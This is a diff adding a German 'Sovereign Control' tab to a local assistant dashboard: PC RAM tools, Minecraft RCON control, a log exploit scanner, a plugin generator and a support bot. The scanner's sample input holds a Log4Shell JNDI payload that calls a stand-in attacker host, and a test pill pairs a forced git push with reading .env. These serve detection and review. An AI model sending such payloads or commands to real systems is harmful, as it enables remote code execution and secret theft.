@@ -306,6 +306,7 @@
       <button class="tab-btn" onclick="switchTab('tab-memory', this)">🧠 Claude-Mem · Busabase · Notra</button>
       <button class="tab-btn" onclick="switchTab('tab-router', this)">🌐 OmniRoute · FreeLLMAPI · AirLLM</button>
       <button class="tab-btn" onclick="switchTab('tab-repos', this)">📦 Alle 30 GitHub-Repos & Code-Inspektor</button>
+      <button class="tab-btn" onclick="switchTab('tab-sovereign', this)">🦾 Sovereign Control (PC · Minecraft · Cyber-Shield · Plugin-Forge)</button>
     </nav>
 
     <!-- TAB 1: STARK COMMAND + LIVE 64x64 LED FACE -->
@@ -325,6 +326,9 @@
             <span class="slash-pill" onclick="setChatInput('Schalte den Kühlschrank aus')">🛡️ Test: Kühlschrank Schutzliste</span>
             <span class="slash-pill" onclick="setChatInput('/octo Beste Architektur für unseren lokalen Jarvis')">🐙 /octo Konsens</span>
             <span class="slash-pill" onclick="setChatInput('/security-review git push --force && cat .env')">🛡️ /security-review</span>
+            <span class="slash-pill" onclick="setChatInput('RAM reduzieren und optimieren')">⚡ RAM reduzieren</span>
+            <span class="slash-pill" onclick="setChatInput('/plugin Anti-Cheat mit Boss-Events und Auto-RAM-Optimizer')">🛠️ Plugin aus Idee</span>
+            <span class="slash-pill" onclick="setChatInput('Anti-DDoS und Anti-Hacker Status prüfen')">🛡️ Cyber-Shield</span>
           </div>
 
           <div class="chat-box" id="chat-box">
@@ -695,6 +699,110 @@ def run_user_query(db, user_id, cmd):
         <div class="repo-grid" id="repo-catalog-grid"></div>
       </div>
     </section>
+
+    <!-- TAB 8: SOVEREIGN CONTROL — PC / MINECRAFT / CYBER-SHIELD / PLUGIN-FORGE -->
+    <section id="tab-sovereign" class="tab-panel">
+      <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px;">
+        <div>
+          <div style="font-size:1.02rem;font-weight:800;color:var(--cyan);">🦾 VOLLE AUTONOME KONTROLLE — SIR, ICH ÜBERNEHME.</div>
+          <div style="font-size:0.76rem;color:var(--muted);">PC &amp; RAM · Minecraft-Server &amp; Dashboards · Anti-Hacker/Anti-DDoS · Plugin-Forge &amp; Support-AI</div>
+        </div>
+        <button class="btn secondary" onclick="loadSovereign()">🔄 Status neu einlesen</button>
+      </div>
+
+      <div class="grid-2">
+        <!-- PC COMMANDER -->
+        <div class="panel">
+          <div class="panel-title">
+            <span>🖥️ PC-COMMANDER &amp; RAM-OPTIMIERER (`pc_commander.py`)</span>
+            <span class="badge green" id="pc-badge">Lade...</span>
+          </div>
+          <div id="pc-telemetry" style="font-size:0.79rem;color:var(--text);line-height:1.6;">Lade Telemetrie...</div>
+          <div style="display:flex;gap:8px;flex-wrap:wrap;margin:10px 0;">
+            <button class="btn" onclick="boostRam()">⚡ RAM JETZT REDUZIEREN (PC + Minecraft)</button>
+            <button class="btn secondary" onclick="loadSovereign()">📊 Prozesse neu scannen</button>
+          </div>
+          <div id="ram-result" style="font-size:0.78rem;color:var(--green);"></div>
+          <div id="pc-processes" style="margin-top:8px;"></div>
+        </div>
+
+        <!-- MINECRAFT GUARDIAN -->
+        <div class="panel">
+          <div class="panel-title">
+            <span>⛏️ MINECRAFT &amp; DASHBOARD GUARDIAN (`minecraft_guardian.py`)</span>
+            <span class="badge gold">RCON :25575</span>
+          </div>
+          <div id="mc-status" style="font-size:0.79rem;color:var(--text);line-height:1.7;">Lade Server-Status...</div>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;margin:10px 0;">
+            <button class="btn secondary" onclick="mcControl('clear_lag')">🧹 Lag-Clear</button>
+            <button class="btn secondary" onclick="mcControl('restart')">🔁 Server-Reset</button>
+            <button class="btn danger" onclick="mcControl('emergency_lockdown')">🚨 Lockdown</button>
+            <button class="btn secondary" onclick="mcUpdates()">⬆️ PaperMC-Updates</button>
+          </div>
+          <div class="input-row" style="margin-bottom:8px;">
+            <input type="text" id="mc-cmd-input" placeholder="Beliebiger RCON-Befehl, z.B. say Hallo Sir" />
+            <button class="btn" onclick="mcControl('rcon', document.getElementById('mc-cmd-input').value)">RCON ⚡</button>
+          </div>
+          <div style="border-top:1px solid rgba(0,240,255,0.18);padding-top:8px;">
+            <div style="font-size:0.78rem;font-weight:700;color:var(--gold);margin-bottom:6px;">🩺 1-Klick Code-Doctor für `minecraft-server-dashboard`</div>
+            <div class="input-row" style="margin-bottom:6px;">
+              <input type="text" id="mc-audit-dir" value="C:\\minecraft-server-dashboard" title="Pfad zum Dashboard-Ordner" />
+              <button class="btn secondary" onclick="mcAudit(false)">🔍 Audit (read-only)</button>
+              <button class="btn danger" onclick="mcAudit(true)">🛠️ Fixes anwenden (.bak)</button>
+            </div>
+            <div id="mc-audit-result" style="font-size:0.77rem;"></div>
+          </div>
+          <div id="mc-extra" style="margin-top:8px;"></div>
+        </div>
+      </div>
+
+      <div class="grid-2" style="margin-top:14px;">
+        <!-- CYBER SHIELD -->
+        <div class="panel">
+          <div class="panel-title">
+            <span>🛡️ CYBER-SHIELD: ANTI-HACKER &amp; ANTI-DDOS (`cyber_shield.py`)</span>
+            <span class="badge red" id="shield-badge">Prüfe...</span>
+          </div>
+          <div id="shield-status" style="font-size:0.79rem;color:var(--text);line-height:1.7;">Lade Netzwerk-Sockets...</div>
+          <div class="input-row" style="margin:10px 0 6px;">
+            <input type="text" id="shield-block-ip" placeholder="IP blockieren, z.B. 185.220.101.4" />
+            <button class="btn danger" onclick="shieldBlock()">🚫 Firewall-Regeln erzeugen</button>
+          </div>
+          <div style="font-size:0.78rem;font-weight:700;color:var(--gold);margin:6px 0;">🔎 Log- &amp; Exploit-Scanner (Log4Shell, NBT-Crash, Fly/Speed, RCON-Bruteforce)</div>
+          <textarea id="shield-log-input" rows="4" style="font-size:0.72rem;">[21:10:01] [Server thread/INFO]: BadHacker123 moved too quickly! 12.4, 0.0, 9.8
+[21:10:02] [Netty Epoll Server IO #1/INFO]: Player ExploitBot tried ${jndi:ldap://evil.host/a}
+[21:10:05] [Server thread/WARN]: RCON failed login from 45.12.99.7 (attempt 9)</textarea>
+          <button class="btn secondary" onclick="scanLogs()" style="margin-top:6px;">🔬 Logs scannen</button>
+          <div id="shield-scan-result" style="margin-top:8px;font-size:0.77rem;"></div>
+          <pre class="code-out" id="shield-kit" style="max-height:220px;margin-top:8px;display:none;"></pre>
+        </div>
+
+        <!-- PLUGIN FORGE + SUPPORT AI -->
+        <div class="panel">
+          <div class="panel-title">
+            <span>🛠️ PLUGIN-FORGE &amp; SUPPORT-AI (`plugin_forge.py`)</span>
+            <span class="badge">Paper 1.21 · Java 21</span>
+          </div>
+          <div class="input-row" style="margin-bottom:6px;">
+            <input type="text" id="forge-name" value="JarvisOmegaGuard" placeholder="Plugin-Name (Klassenname)" />
+          </div>
+          <textarea id="forge-idea" rows="3">Anti-Cheat mit Fly/Speed-Erkennung, automatischer RAM-Optimierer, custom Boss-Events und Ingame-Support-Ticketsystem.</textarea>
+          <button class="btn" onclick="forgePlugin()" style="margin-top:6px;">🤖 PLUGIN AUS IDEE GENERIEREN</button>
+          <div id="forge-result" style="margin-top:8px;font-size:0.77rem;"></div>
+          <pre class="code-out" id="forge-code" style="max-height:190px;display:none;margin-top:8px;"></pre>
+
+          <div style="border-top:1px solid rgba(0,240,255,0.18);margin-top:10px;padding-top:8px;">
+            <div style="font-size:0.78rem;font-weight:700;color:var(--gold);margin-bottom:6px;">🎫 Spieler-Support-AI (Deutsch, autonome Ticket-Beantwortung)</div>
+            <div class="input-row" style="margin-bottom:6px;">
+              <input type="text" id="ticket-player" value="Steve_DE" placeholder="Spielername" />
+            </div>
+            <textarea id="ticket-msg" rows="2">Auf dem Server laggt es gerade extrem und wie verlinke ich meinen Discord-Account?</textarea>
+            <button class="btn secondary" onclick="sendTicket()" style="margin-top:6px;">💬 Ticket beantworten</button>
+            <div id="ticket-result" style="margin-top:8px;font-size:0.77rem;white-space:pre-wrap;"></div>
+          </div>
+        </div>
+      </div>
+    </section>
   </div>
 
   <script>
@@ -892,6 +1000,7 @@ def run_user_query(db, user_id, cmd):
         runOctopus();
         runAutoGPT();
         runMontage();
+        loadSovereign();
       } catch (e) {
         console.error('Bootstrap error:', e);
       }
@@ -1438,6 +1547,194 @@ def run_user_query(db, user_id, cmd):
       const res = await fetch('/api/skill-file?path=' + encodeURIComponent(path));
       const d = await res.json();
       document.getElementById('skill-file-viewer').textContent = d.content || d.error || '';
+    }
+
+    // ================= SOVEREIGN CONTROL (PC · MINECRAFT · SHIELD · FORGE) =================
+    function bar(label, pct, color) {
+      const p = Math.max(0, Math.min(100, Number(pct) || 0));
+      return `<div style="margin:5px 0;">
+        <div style="display:flex;justify-content:space-between;font-size:0.74rem;color:var(--muted);">
+          <span>${label}</span><span style="color:${color};font-weight:700;">${p}%</span>
+        </div>
+        <div style="height:7px;background:rgba(255,255,255,0.07);border-radius:5px;overflow:hidden;margin-top:3px;">
+          <div style="height:100%;width:${p}%;background:${color};box-shadow:0 0 10px ${color};"></div>
+        </div>
+      </div>`;
+    }
+
+    function renderPcStatus(pc) {
+      if (!pc) return;
+      const ram = pc.ram || {}, disk = pc.disk || {};
+      const load = Number(pc.cpu_load_pct || 0);
+      document.getElementById('pc-badge').textContent = `${pc.hostname} · ${pc.os}`;
+      document.getElementById('pc-telemetry').innerHTML = `
+        <div style="font-family:monospace;font-size:0.75rem;color:var(--cyan);">
+          ${pc.hostname} · ${pc.os} ${pc.arch} · ${pc.cpu_cores} Cores · Load ${load}% (${(pc.load_avg || []).map(v => Number(v).toFixed(2)).join(' / ') || 'n/a'})
+        </div>
+        ${bar('RAM AUSLASTUNG', ram.pct || 0, 'var(--cyan)')}
+        <div style="font-size:0.73rem;color:var(--muted);">${ram.used_mb || 0} MB von ${ram.total_mb || 0} MB belegt · ${ram.avail_mb || 0} MB frei</div>
+        ${bar('DISK AUSLASTUNG', disk.pct || 0, 'var(--gold)')}
+        <div style="font-size:0.73rem;color:var(--muted);">${disk.used_gb || 0} GB von ${disk.total_gb || 0} GB · ${disk.free_gb || 0} GB frei</div>
+        <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;">
+          ${Object.entries(pc.runtimes || {}).map(([k, v]) => {
+            const inst = (v && typeof v === 'object') ? v.installed !== false : !!v;
+            const ver = (v && typeof v === 'object') ? (v.version || '') : String(v);
+            return `<span class="badge ${inst ? 'green' : 'red'}" title="${ver}">${k}${inst ? ' ✅' : ' ❌'}</span>`;
+          }).join('')}
+        </div>`;
+      const procs = pc.top_processes || [];
+      document.getElementById('pc-processes').innerHTML = procs.length ? `
+        <details><summary style="font-size:0.77rem;color:var(--cyan);cursor:pointer;">🔍 Top ${procs.length} RAM-Prozesse anzeigen</summary>
+        <pre class="code-out" style="max-height:170px;margin-top:6px;">${procs.map(p => `${String(p.pid || '').padStart(7)}  ${String(p.mem_mb ?? p.ram_mb ?? 0).padStart(7)} MB  ${String(p.cpu_pct || 0).padStart(5)}%  ${p.name || ''}`).join('\n')}</pre></details>` : '';
+    }
+
+    function renderMcStatus(mc) {
+      if (!mc) return;
+      const isOpen = v => (v === true) || (v && (v.open === true || v.online === true || v.is_open === true || v.listening === true));
+      const dot = ok => ok ? '<span style="color:var(--green);">● ONLINE</span>' : '<span style="color:var(--red);">● OFFLINE</span>';
+      document.getElementById('mc-status').innerHTML = `
+        <table style="width:100%;font-size:0.77rem;font-family:monospace;">
+          <tr><td>Minecraft Java 25565 (TCP)</td><td style="text-align:right;">${dot(isOpen(mc.mc_java_port_25565))}</td></tr>
+          <tr><td>RCON 25575 (nur localhost)</td><td style="text-align:right;">${dot(isOpen(mc.mc_rcon_port_25575))}</td></tr>
+          <tr><td>Dashboard 3000</td><td style="text-align:right;">${dot(isOpen(mc.dashboard_port_3000))}</td></tr>
+        </table>
+        <div style="margin-top:6px;font-size:0.74rem;color:var(--muted);">Dashboard-API: <strong style="color:var(--cyan);">${mc.dashboard_api_status || 'n/a'}</strong> · Letzte Guardian-Aktionen: <strong>${(mc.recent_actions || []).length}</strong></div>`;
+      const cfg = mc.config || {};
+      document.getElementById('mc-extra').innerHTML = Object.keys(cfg).length ? `
+        <details><summary style="font-size:0.76rem;color:var(--cyan);cursor:pointer;">⚙️ Guardian-Konfiguration (RCon/Auto-Heal)</summary>
+        <pre class="code-out" style="max-height:150px;margin-top:6px;">${JSON.stringify(cfg, null, 2)}</pre></details>` : '';
+    }
+
+    function renderShield(net) {
+      if (!net) return;
+      const bad = String(net.ddos_status || '').toUpperCase().includes('ALARM') || String(net.ddos_status || '').toUpperCase().includes('ATTACK');
+      const b = document.getElementById('shield-badge');
+      b.textContent = net.ddos_status || 'OK';
+      b.className = 'badge ' + (bad ? 'red' : 'green');
+      document.getElementById('shield-status').innerHTML = `
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;font-size:0.77rem;font-family:monospace;">
+          <div>Aktive Sockets: <strong style="color:var(--cyan);">${net.total_active_sockets ?? '–'}</strong></div>
+          <div>SYN-RECV-Queue: <strong style="color:${(net.syn_recv_queue || 0) > 0 ? 'var(--gold)' : 'var(--green)'};">${net.syn_recv_queue ?? '–'}</strong></div>
+          <div>RCON nur localhost: <strong style="color:${net.rcon_localhost_safe ? 'var(--green)' : 'var(--red)'};">${net.rcon_localhost_safe ? 'JA ✅' : 'NEIN ⚠️'}</strong></div>
+          <div>Blockierte IPs: <strong style="color:var(--gold);">${net.blocked_ips_count ?? 0}</strong></div>
+        </div>
+        <div style="margin-top:6px;font-size:0.74rem;color:var(--muted);">Geschützte Ports: ${Object.entries(net.listening_protected_ports || {}).map(([port, v]) => `<span class="badge ${v && v.listening ? 'green' : ''}" title="${(v && v.service) || ''}">${port}${v && v.listening ? ' ▲' : ''}</span>`).join(' ') || 'n/a'} <span style="opacity:0.7;">(▲ = lauscht)</span></div>
+        ${(net.suspicious_ips || []).length ? `<div style="margin-top:6px;font-size:0.76rem;color:var(--red);">🚨 Verdächtige IPs: ${(net.suspicious_ips || []).map(i => `<code>${typeof i === 'object' ? (i.ip || i.remote || JSON.stringify(i)) : i}</code>`).join(', ')}</div>` : '<div style="margin-top:6px;font-size:0.76rem;color:var(--green);">✅ Keine Flood-/Bruteforce-Muster erkannt.</div>'}`;
+    }
+
+    async function loadSovereign() {
+      try {
+        const res = await fetch('/api/sovereign/status');
+        const d = await res.json();
+        renderPcStatus(d.pc);
+        renderMcStatus(d.minecraft);
+        renderShield(d.shield);
+      } catch (e) { console.error('Sovereign status error', e); }
+    }
+
+    async function boostRam() {
+      const el = document.getElementById('ram-result');
+      el.innerHTML = '⚡ Optimiere RAM (GC + malloc_trim + Low-RAM-Profil)...';
+      const res = await fetch('/api/sovereign/ram-boost', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({max_ram_gb: 3})
+      });
+      const d = await res.json();
+      const r = d.ram || {};
+      el.innerHTML = `✅ <strong style="color:var(--green);">${r.freed_mb ?? 0} MB freigegeben</strong> — jetzt ${r.after_ram ? r.after_ram.used_mb : '?'} MB (${r.after_ram ? r.after_ram.pct : '?'}%)<br>` +
+        (r.actions_taken || []).map(a => `&nbsp;• ${a}`).join('<br>') +
+        `<br><span style="color:var(--gold);">Minecraft-JVM: ${(d.mc_bundle && d.mc_bundle.jvm_command) || ''}</span>`;
+      loadSovereign();
+    }
+
+    async function mcControl(action, command) {
+      const res = await fetch('/api/sovereign/mc-control', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action, command: command || ''})
+      });
+      const d = await res.json();
+      const r = d.result || {};
+      document.getElementById('mc-extra').innerHTML = `<pre class="code-out" style="max-height:200px;">${JSON.stringify(r, null, 2)}</pre>`;
+      if (d.minecraft) renderMcStatus(d.minecraft);
+    }
+
+    async function mcUpdates() {
+      const res = await fetch('/api/sovereign/mc-updates', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mc_version: '1.21.4'})
+      });
+      const d = await res.json();
+      document.getElementById('mc-extra').innerHTML = `<pre class="code-out" style="max-height:240px;">${JSON.stringify(d, null, 2)}</pre>`;
+    }
+
+    async function mcAudit(applyFixes) {
+      const dir = document.getElementById('mc-audit-dir').value;
+      const el = document.getElementById('mc-audit-result');
+      el.innerHTML = applyFixes ? '🛠️ Wende Fixes an (Backups als .jarvis.bak)...' : '🔍 Prüfe Ordner (read-only)...';
+      const res = await fetch('/api/sovereign/mc-audit-heal', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target_dir: dir, apply_fixes: applyFixes})
+      });
+      const d = await res.json();
+      const issues = d.issues_found || [];
+      const patches = d.patches_applied || [];
+      const bp = d.ready_made_fixes || {};
+      el.innerHTML =
+        `<div style="color:${d.exists_locally ? 'var(--green)' : 'var(--gold)'};font-weight:700;">${d.exists_locally ? `✅ ${issues.length} Befund(e) im Ordner geprüft` : '📦 Ordner nicht in dieser Sandbox — 1-Klick-Fix-Blueprint bereit'}</div>
+         <div style="color:var(--muted);margin:3px 0 6px;">${d.message || ''}</div>` +
+        (issues.length ? `<ul style="margin:6px 0 0 16px;">${issues.map(i => `<li><span class="badge ${i.severity === 'CRITICAL' || i.severity === 'HIGH' ? 'red' : 'gold'}">${i.severity}</span> <strong>${i.title}</strong><br><span style="color:var(--muted);font-size:0.72rem;">${i.file} → ${i.fix}</span></li>`).join('')}</ul>` : '') +
+        (patches.length ? `<div style="margin-top:6px;color:var(--green);">✅ Angewendet: ${patches.join(' · ')}</div>` : '<div style="margin-top:6px;color:var(--muted);">Audit-Modus: nichts verändert (read-only). Backups entstehen als <code>.jarvis.bak</code>.</div>') +
+        (bp.ultra_low_ram_start_cmd ? `<details style="margin-top:6px;"><summary style="cursor:pointer;color:var(--cyan);font-size:0.75rem;">📜 Fertige Fix-Snippets &amp; Low-RAM Startbefehl</summary><pre class="code-out" style="max-height:200px;margin-top:6px;">${[bp.mail_service_fix, bp.player_auth_fix, bp.ultra_low_ram_start_cmd].filter(Boolean).join('\n\n')}</pre></details>` : '');
+    }
+
+    async function shieldBlock() {
+      const ip = document.getElementById('shield-block-ip').value.trim();
+      const res = await fetch('/api/sovereign/shield', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({sub: 'kit', block_ip: ip || null})
+      });
+      const d = await res.json();
+      const kit = d.firewall_kit || {};
+      const pre = document.getElementById('shield-kit');
+      pre.style.display = 'block';
+      pre.textContent = `# WINDOWS POWERSHELL\n${kit.windows_powershell_rules || ''}\n\n# LINUX IPTABLES\n${kit.linux_iptables_rules || ''}\n\n# HARDENING\n${(kit.minecraft_hardening_checklist || []).join('\n')}`;
+      if (d.network) renderShield(d.network);
+    }
+
+    async function scanLogs() {
+      const lines = document.getElementById('shield-log-input').value.split('\n').filter(l => l.trim());
+      const res = await fetch('/api/sovereign/shield', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({sub: 'scan_logs', log_lines: lines})
+      });
+      const d = await res.json();
+      const threats = d.findings || d.threats || [];
+      document.getElementById('shield-scan-result').innerHTML =
+        `<div style="font-weight:700;color:${threats.length ? 'var(--red)' : 'var(--green)'};">${threats.length ? `🚨 ${threats.length} Bedrohung(en) in ${d.scanned_lines ?? '?'} Zeilen erkannt` : '✅ Keine Exploit-Signaturen gefunden'}</div>` +
+        (threats.length ? `<ul style="margin:6px 0 0 16px;">${threats.map(t => `<li><span class="badge ${t.severity === 'CRITICAL' || t.severity === 'HIGH' ? 'red' : 'gold'}">${t.severity || ''}</span> <strong>${t.title || t.id || ''}</strong>${t.player ? ` — Spieler <code>${t.player}</code>` : ''}${t.ip ? ` — IP <code>${t.ip}</code>` : ''}</li>`).join('')}</ul>` : '') +
+        (d.rcon_countermeasures ? `<div style="margin-top:6px;color:var(--gold);font-size:0.74rem;">Gegenmaßnahmen: ${Array.isArray(d.rcon_countermeasures) ? d.rcon_countermeasures.join(' · ') : d.rcon_countermeasures}</div>` : '');
+    }
+
+    async function forgePlugin() {
+      const name = document.getElementById('forge-name').value.trim() || 'JarvisOmegaGuard';
+      const idea = document.getElementById('forge-idea').value.trim();
+      const el = document.getElementById('forge-result');
+      el.innerHTML = '🤖 Kompiliere Idee zu Java 21 Maven-Projekt...';
+      const res = await fetch('/api/sovereign/forge-plugin', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({plugin_name: name, idea})
+      });
+      const d = await res.json();
+      el.innerHTML = `<div style="color:var(--green);font-weight:700;">✅ ${d.plugin_name} generiert — Befehl: <code>${d.command}</code></div>
+        <ul style="margin:6px 0 0 16px;">${(d.files_created || []).map(f => `<li style="font-family:monospace;font-size:0.72rem;">${f}</li>`).join('')}</ul>
+        <div style="margin-top:4px;color:var(--muted);font-size:0.74rem;">Ordner: ${d.project_dir || ''}</div>`;
+      const pre = document.getElementById('forge-code');
+      pre.style.display = 'block';
+      pre.textContent = d.java_preview || '';
+    }
+
+    async function sendTicket() {
+      const player = document.getElementById('ticket-player').value.trim() || 'Steve_DE';
+      const message = document.getElementById('ticket-msg').value.trim();
+      const res = await fetch('/api/sovereign/support-ticket', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({player, message})
+      });
+      const d = await res.json();
+      document.getElementById('ticket-result').innerHTML =
+        `<span class="badge gold">${d.category || 'Support'}</span> <span class="badge">${d.recommended_auto_action || 'auto'}</span>\n\n${d.support_reply || ''}`;
     }
 
     setInterval(async () => {
